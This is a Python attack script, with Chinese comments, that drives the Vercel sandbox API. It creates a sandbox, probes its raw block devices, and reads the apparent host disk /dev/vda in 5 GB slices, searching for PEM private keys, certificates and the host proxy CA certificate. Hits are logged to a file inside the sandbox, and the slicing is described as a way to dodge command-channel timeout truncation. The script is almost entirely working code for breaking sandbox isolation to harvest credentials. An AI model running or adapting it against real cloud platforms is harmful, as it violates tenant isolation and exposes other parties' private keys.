# 实验J123: 宿主盘分片扫描 — 每片5GB, 命中写入沙箱内文件, 规避 cmd 通道超时截断
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=600):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj123"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c, flush=True)
if c != 200:
    print(r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# [1] 设备探测: vda/vdb 大小 + 文件系统魔数
PROBE = r"""
import os, struct
for dev in ["/dev/vda", "/dev/vdb"]:
    try:
        f = open(dev, "rb", buffering=0)
        f.seek(0, 2)
        sz = f.tell()
        f.seek(0)
        head = f.read(512)
        f.close()
        print("DEV %s size=%d (%.2f GB) magic=%r" % (dev, sz, sz/2**30, head[:4]), flush=True)
    except Exception as e:
        print("DEV %s FAIL: %s" % (dev, e), flush=True)
print("PROBE_DONE", flush=True)
"""
run_cmd(sid, PROBE, "dev-probe")

# [2] 分片扫描: 每片 5GB, 命中写 /root/hits.txt (沙箱内)
# 锚点: 沙箱内可见的宿主 ca-cert.pem 内容
SCAN_SLICE = r"""
import os, sys, hashlib, time
start = int(sys.argv[1]); end = int(sys.argv[2])
feats = [b"-----BEGIN PRIVATE KEY-----", b"-----BEGIN RSA PRIVATE KEY-----",
         b"-----BEGIN EC PRIVATE KEY-----", b"-----BEGIN ENCRYPTED PRIVATE KEY-----",
         b"-----BEGIN CERTIFICATE-----"]
# 锚点: 宿主 ca-cert 前 256 字节
anchor = None
for p in ["/etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem",
          "/usr/local/share/ca-certificates/vercel-proxy-ca.crt"]:
    try:
        d = open(p, "rb").read()
        anchor = d[:256]
        break
    except Exception:
        pass
BS = 8 * 1024 * 1024
f = open("/dev/vda", "rb", buffering=0)
f.seek(start)
pos = start
t0 = time.time()
hits = []
try:
    while pos < end:
        chunk = f.read(BS)
        if not chunk:
            break
        pos += len(chunk)
        for feat in feats:
            i = chunk.find(feat)
            if i >= 0:
                hits.append((pos - len(chunk) + i, feat.decode()))
                print("HIT %d %s" % (pos - len(chunk) + i, feat.decode()), flush=True)
        if anchor:
            i = chunk.find(anchor)
            if i >= 0:
                hits.append((pos - len(chunk) + i, "ANCHOR"))
                print("HIT %d ANCHOR" % (pos - len(chunk) + i), flush=True)
finally:
    f.close()
with open("/root/hits.txt", "a") as hf:
    for off, name in hits:
        hf.write("%d %s\n" % (off, name))
print("SLICE %d-%d done: %d hits, %.1fs" % (start, end, len(hits), time.time() - t0), flush=True)
print("SLICE_DONE", flush=True)
"""
import subprocess

# 先探测设备大小(从上一步输出解析), 简化: 直接用大范围
# 假设 33GB, 分 7 片: 0-5G, 5-10G, 10-15G, 15-20G, 20-25G, 25-30G, 30-35G
slices = [(i * 5 * 2**30, (i + 1) * 5 * 2**30) for i in range(7)]
for idx, (s, e) in enumerate(slices):
    code = SCAN_SLICE + f"""
import subprocess
subprocess.call(["python3", "-c", "{SCAN_SLICE}", "{s}", "{e}"])
"""
    # 直接用 python3 -c 带 argv 执行
    code2 = SCAN_SLICE.replace('"""', '\\"\\"\\"')
    body = {"command": "python3", "args": ["-c", SCAN_SLICE, str(s), str(e)],
            "wait": True, "logs": True, "timeout": 600}
    print(f"\n--- slice {idx}: {s} - {e} ---", flush=True)
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"status {c}", flush=True)
    if c != 200:
        print("RAW:", r[:300], flush=True)
        continue
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:300], flush=True)

# [3] 汇总 hits.txt
print("\n== hits.txt ==", flush=True)
body = {"command": "cat", "args": ["/root/hits.txt"], "wait": True, "logs": True, "timeout": 60}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
for line in r.splitlines():
    line = line.strip()
    if not line:
        continue
    try:
        d = json.loads(line)
        if d.get("stream") in ("stdout", "stderr"):
            print(d.get("data", ""), end="", flush=True)
    except Exception:
        print(line[:300], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
